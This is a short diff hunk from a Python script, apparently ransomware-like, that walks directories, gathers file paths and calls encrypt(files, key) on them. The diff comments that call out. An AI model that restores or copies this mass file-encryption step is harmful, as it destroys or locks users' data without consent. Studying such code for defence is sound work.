@@ -75,7 +75,7 @@ if __name__ == '__main__':
                         directories.add(path+"\\"+item)
                     else:
                         files.add(path+"\\"+item) 
-                encrypt(files, key)
+                # encrypt(files, key)
 
             except Exception as e:
                 print('Error:', e)
